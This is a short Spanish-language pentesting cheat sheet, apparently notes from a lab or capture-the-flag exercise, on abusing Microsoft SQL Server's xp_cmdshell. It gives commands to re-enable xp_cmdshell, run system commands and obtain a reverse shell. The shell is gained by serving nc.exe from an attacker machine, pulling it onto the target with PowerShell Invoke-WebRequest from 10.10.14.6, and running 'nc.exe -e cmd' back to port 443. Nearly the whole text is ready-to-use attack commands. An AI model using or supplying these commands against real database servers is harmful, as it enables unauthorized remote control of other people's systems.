** Objeto xp_cmdshell **
Utilidad propia de los servidores MSQL Server para ejecutar comandos sobre el equipo en el que está la base de datos montada.

Uso: 
> Ejecución de comandos:
> `xp_cmdshell "whoami"`
> Habilitar xp_cmdshell si estuviese deshabilitado:
> `SP_CONFIGURE "show advanced options". 1`
> `reconfigure`
> `SP_CONFIGURE "xp_cmdshell". 1`
> `reconfigure`

** Obtener reverse-shell gracias al objeto xp_cmdshell **
> Compartir binario nc.exe:
> `python -m SimpleHTTPServer`
> Transferir netcat desde máquina objetivo, con Powershell:
> `xp_cmdshell 'powershell Invoke-WebRequest http://10.10.14.6:8000/nc.exe C:\Windows\Temp\nc.exe`
> Puerto en escucha para recibir la reverse shell en máquina atacante:
> `rlwrap nc -nlvp 443`
> Ejecutar netcat en máquina objetivo para recibir la reverse shell:
> `xp_cmdshell "start /b C:\Windows\Temp\nc.exe -e cmd 10.10.14.6 443"`


